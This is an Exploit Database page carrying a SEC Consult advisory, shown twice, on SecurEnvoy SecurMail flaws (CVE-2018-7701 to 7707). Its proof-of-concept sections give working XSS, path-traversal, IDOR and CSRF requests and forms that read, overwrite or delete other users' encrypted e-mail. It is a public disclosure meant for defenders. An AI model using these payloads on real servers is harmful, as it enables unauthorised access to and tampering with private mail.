Vendor description:
-------------------
"Sending and receiving encrypted emails is not an easy or simple experience.
Businesses rely on email with an increasing amount of sensitive data sent across
their networks. A revolutionary approach that doesn't suffer from the overheads
of deployment and encryption management; just rock-solid security to give you
100% confidence in your business communications."

URL: https://www.securenvoy.com/products/securmail/key-features.shtm

Business recommendation:
------------------------
During a brief crash test of the SecurEnvoy SecurMail application several severe
vulnerabilities have been identified that break the core security promises of
the product.

These vulnerabilities open the possibility for several different attack
scenarios that allow an attacker to read other users' encrypted e-mails and
overwrite or delete e-mails stored in other users' inboxes.

As we have identified several critical vulnerabilities within a very short time
frame we expect numerous other vulnerabilities to be present.

As other SecureEnvoy products (besides the analyzed SecurMail) appear
to be highly integrated (all products are installed with a single setup
file) we suspect other components to also suffer from severe security deficits.

We recommend not to use SecurEnvoy products (especially SecurMail) in a
production environment until:
* a comprehensive security audit has been performed and
* state of the art security mechanisms have been adopted.

Vulnerability overview/description:
-----------------------------------
1) Cross Site Scripting (CVE-2018-7703, CVE-2018-7707)
SEC Consult did not find any functionality that encodes user input when creating
HTML pages. Therefore persistent and reflected cross site scripting attacks are
possible throughout the application.

Some pages fail to properly decode URL encoded parameters. Because of this, cross
site scripting cannot be exploited on these pages in most browsers.

2) Path Traversal (CVE-2018-7705, CVE-2018-7706)
SEC Consult did not find any path traversal checks throughout the application.
Since the application uses encrypted files as the primary method of data
storage, this vulnerability can be exploited at several points.

Using this vulnerability, a legitimate recipient can read mails sent to other
recipients in plain text!

3) Insecure Direct Object Reference (CVE-2018-7704)
Authorization checks are only partially implemented. This allows a legitimate
recipient to read mails sent to other users in plain text.

4) Missing Authentication and Authorization (CVE-2018-7702)
In order to send encrypted e-mails a client does not need to authenticate on the
SecurEnvoy server. Therefore anyone with network access to the server can
arbitrarily send e-mails that appear to come from an arbitrary sender address.

Moreover, an attacker with network access to the server can re-send previous
communication to arbitrary recipients. This allows him/her to extract all
e-mails stored on the server. An attacker could also modify arbitrary messages
stored on the server.

5) Cross Site Request Forgery (CVE-2018-7701)
SEC Consult did not find any protection against cross site request forgery. An
attacker could use this vulnerability to delete a victim's e-mail or to
impersonate the victim and reply to his/her e-mails.

Since these vulnerabilities were found during a very short time frame, SEC
Consult believes that the product may contain a large number of other security
vulnerabilities. As already several core security promises have been broken
during this short crash test, no further tests were conducted.

Proof of concept:
-----------------
1) Cross Site Scripting
a) The following HTML fragments demonstrates reflected cross site scripting
   (CVE-2018-7703):

--- snip ---
<form action="http://<host>/secmail/getmessage.exe" method="POST"
    enctype="text/plain">
  <input type="hidden" name="mailboxid"

value=""><script>alert&#40;&apos;xss&apos;&#41;<&#47;script>" />
  <input type="submit" value="Submit request" />
</form>
--- snip ---

b) E-mails that are sent using the HTML format can contain any <script> tags
   (CVE-2018-7707). These are executed once the victim opens the message in the
   web interface.

2) Path Traversal
a) The following request demonstrates how the message body of the e-mail with id
   107 can be overwritten while uploading the body for message 103. The message
   IDs can easily be guessed since they are assigned sequentially
   (CVE-2018-7705).

--- snip---
POST /secupload2/upload.aspx HTTP/1.1
Host: <host>
Content-Type: multipart/form-data; boundary=--------822119548
Content-Length: 309

----------822119548
Content-Disposition: form-data; name="FileName"

x
----------822119548
Content-Disposition: form-data; name="MessageID"

103
----------822119548
Content-Disposition: form-data; filename="../107/BODY"
Content-Type: application/octet-stream

some message
----------822119548--
--- snip ---

b) The following link demonstrates how the message body of the e-mail with id
   107 can be retrieved while only having access to the mail with id 103
   (CVE-2018-7706):

http://<host>/secmail/getmessage.exe?mailboxid=<mailbox-id>&action=attachment&option1=103&option2=../107/BODY

3) Insecure Direct Object Reference (CVE-2018-7704)
The functionality that allows a recipient to read an e-mail checks whether the
user is actually authorized to read the requested e-mail. However, by using the
functionality that allows a user to reply to an e-mail, an attacker can
manipulate the id that is sent as a URL parameter to read arbitrary e-mails.
The following link demonstrates the retrieval of the message with id 103. The
message id can easily be guessed since they are assigned sequentially.

http://<host>/secmail/getmessage.exe?mailboxid=<mailboxid>&action=reply&option1=103

4) Missing Authorization (CVE-2018-7702)
In order to send an e-mail to a recipient the following requests have to be
made:
 1. Execute a GETINFO request in order to request a message id.
 2. Upload the message body and the attachments.
 3. Execute a STORE request to send the message to the recipients.

Neither of these requests require any authentication. Therefore, also no
authorization is made. Attack scenarios include:
a) Extract any message by executing step #3 while specifying an own e-mail
   address as recipient and the message id to extract.
b) Overwrite attachments or message bodies of previously sent e-mails by
   executing step #2 to upload arbitrary content.

5) Cross-Site Request Forgery
SEC Consult did not find any CSRF protection within the web interface. Moreover,
CSRF attacks are possible against the API used to send e-mails. Since this API
does not require authentication, being authenticated on the server is not a
precondition for a successful attack. Instead, the attack exploits the victim's
network location.

a) The following link demonstrates how e-mails can be deleted using a CSRF
   attack (CVE-2018-7701):

http://<host>/secmail/getmessage.exe?mailboxid=<mailboxid>&action=delete&option1=103

b) The following HTML fragment demonstrates how the API can be exploited to send
   an e-mail with an arbitrary message id to an arbitrary recipient (also
   CVE-2018-7702):

<form action="http://<host>/secserver/securectrl.exe" method="POST"
    enctype="text/plain">
 <input type="hidden"
 name="FLAG&#58;STORE&#13;&#10;VERSION&#58;1&#46;0&#13;&#10;RECIPIENT&#95;MOBILE&#95;LIST&#58;SMTP" value="bob&#64;local&#58;MOBILE&#61;00000&#13;&#10;SENDER&#58;me&#64;local&#13;&#10;RECORDED&#95;DELIVERY&#58;&#13;&#10;SUBJECTB64&#58;AAAA&#13;&#10;MESSAGEID&#58;108&#13;&#10;SENDERMOBILE&#58;000000&#13;&#10;REPLY&#58;False" />
 <input type="submit" value="Submit request" />
</form>

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Vendor description:
-------------------
"Sending and receiving encrypted emails is not an easy or simple experience.
Businesses rely on email with an increasing amount of sensitive data sent across
their networks. A revolutionary approach that doesn't suffer from the overheads
of deployment and encryption management; just rock-solid security to give you
100% confidence in your business communications."

URL: <https://www.securenvoy.com/products/securmail/key-features.shtm>

Business recommendation:
------------------------
During a brief crash test of the SecurEnvoy SecurMail application several severe
vulnerabilities have been identified that break the core security promises of
the product.

These vulnerabilities open the possibility for several different attack
scenarios that allow an attacker to read other users' encrypted e-mails and
overwrite or delete e-mails stored in other users' inboxes.

As we have identified several critical vulnerabilities within a very short time
frame we expect numerous other vulnerabilities to be present.

As other SecureEnvoy products (besides the analyzed SecurMail) appear
to be highly integrated (all products are installed with a single setup
file) we suspect other components to also suffer from severe security deficits.

We recommend not to use SecurEnvoy products (especially SecurMail) in a
production environment until:
* a comprehensive security audit has been performed and
* state of the art security mechanisms have been adopted.

Vulnerability overview/description:
-----------------------------------
1) Cross Site Scripting (CVE-2018-7703, CVE-2018-7707)
SEC Consult did not find any functionality that encodes user input when creating
HTML pages. Therefore persistent and reflected cross site scripting attacks are
possible throughout the application.

Some pages fail to properly decode URL encoded parameters. Because of this, cross
site scripting cannot be exploited on these pages in most browsers.

2) Path Traversal (CVE-2018-7705, CVE-2018-7706)
SEC Consult did not find any path traversal checks throughout the application.
Since the application uses encrypted files as the primary method of data
storage, this vulnerability can be exploited at several points.

Using this vulnerability, a legitimate recipient can read mails sent to other
recipients in plain text!

3) Insecure Direct Object Reference (CVE-2018-7704)
Authorization checks are only partially implemented. This allows a legitimate
recipient to read mails sent to other users in plain text.

4) Missing Authentication and Authorization (CVE-2018-7702)
In order to send encrypted e-mails a client does not need to authenticate on the
SecurEnvoy server. Therefore anyone with network access to the server can
arbitrarily send e-mails that appear to come from an arbitrary sender address.

Moreover, an attacker with network access to the server can re-send previous
communication to arbitrary recipients. This allows him/her to extract all
e-mails stored on the server. An attacker could also modify arbitrary messages
stored on the server.

5) Cross Site Request Forgery (CVE-2018-7701)
SEC Consult did not find any protection against cross site request forgery. An
attacker could use this vulnerability to delete a victim's e-mail or to
impersonate the victim and reply to his/her e-mails.

Since these vulnerabilities were found during a very short time frame, SEC
Consult believes that the product may contain a large number of other security
vulnerabilities. As already several core security promises have been broken
during this short crash test, no further tests were conducted.

Proof of concept:
-----------------
1) Cross Site Scripting
a) The following HTML fragments demonstrates reflected cross site scripting
   (CVE-2018-7703):

--- snip ---
<form action="http://<host>/secmail/getmessage.exe" method="POST"
    enctype="text/plain">
  <input type="hidden" name="mailboxid"

value="&quot;&gt;&lt;script&gt;alert&#40;&apos;xss&apos;&#41;&lt;&#47;script&gt;" />
  <input type="submit" value="Submit request" />
</form>
--- snip ---

b) E-mails that are sent using the HTML format can contain any <script> tags
   (CVE-2018-7707). These are executed once the victim opens the message in the
   web interface.

2) Path Traversal
a) The following request demonstrates how the message body of the e-mail with id
   107 can be overwritten while uploading the body for message 103. The message
   IDs can easily be guessed since they are assigned sequentially
   (CVE-2018-7705).

--- snip---
POST /secupload2/upload.aspx HTTP/1.1
Host: <host>
Content-Type: multipart/form-data; boundary=--------822119548
Content-Length: 309

----------822119548
Content-Disposition: form-data; name="FileName"

x
----------822119548
Content-Disposition: form-data; name="MessageID"

103
----------822119548
Content-Disposition: form-data; filename="../107/BODY"
Content-Type: application/octet-stream

some message
----------822119548--
--- snip ---

b) The following link demonstrates how the message body of the e-mail with id
   107 can be retrieved while only having access to the mail with id 103
   (CVE-2018-7706):

http://<host>/secmail/getmessage.exe?mailboxid=<mailbox-id>&action=attachment&option1=103&option2=../107/BODY

3) Insecure Direct Object Reference (CVE-2018-7704)
The functionality that allows a recipient to read an e-mail checks whether the
user is actually authorized to read the requested e-mail. However, by using the
functionality that allows a user to reply to an e-mail, an attacker can
manipulate the id that is sent as a URL parameter to read arbitrary e-mails.
The following link demonstrates the retrieval of the message with id 103. The
message id can easily be guessed since they are assigned sequentially.

http://<host>/secmail/getmessage.exe?mailboxid=<mailboxid>&action=reply&option1=103

4) Missing Authorization (CVE-2018-7702)
In order to send an e-mail to a recipient the following requests have to be
made:
 1. Execute a GETINFO request in order to request a message id.
 2. Upload the message body and the attachments.
 3. Execute a STORE request to send the message to the recipients.

Neither of these requests require any authentication. Therefore, also no
authorization is made. Attack scenarios include:
a) Extract any message by executing step #3 while specifying an own e-mail
   address as recipient and the message id to extract.
b) Overwrite attachments or message bodies of previously sent e-mails by
   executing step #2 to upload arbitrary content.

5) Cross-Site Request Forgery
SEC Consult did not find any CSRF protection within the web interface. Moreover,
CSRF attacks are possible against the API used to send e-mails. Since this API
does not require authentication, being authenticated on the server is not a
precondition for a successful attack. Instead, the attack exploits the victim's
network location.

a) The following link demonstrates how e-mails can be deleted using a CSRF
   attack (CVE-2018-7701):

http://<host>/secmail/getmessage.exe?mailboxid=<mailboxid>&action=delete&option1=103

b) The following HTML fragment demonstrates how the API can be exploited to send
   an e-mail with an arbitrary message id to an arbitrary recipient (also
   CVE-2018-7702):

<form action="http://<host>/secserver/securectrl.exe" method="POST"
    enctype="text/plain">
 <input type="hidden"
 name="FLAG&#58;STORE&#13;&#10;VERSION&#58;1&#46;0&#13;&#10;RECIPIENT&#95;MOBILE&#95;LIST&#58;SMTP"
value="bob&#64;local&#58;MOBILE&#61;00000&#13;&#10;SENDER&#58;me&#64;local&#13;&#10;RECORDED&#95;DELIVERY&#58;&#13;&#10;SUBJECTB64&#58;AAAA&#13;&#10;MESSAGEID&#58;108&#13;&#10;SENDERMOBILE&#58;000000&#13;&#10;REPLY&#58;False"
 />
 <input type="submit" value="Submit request" />
</form>
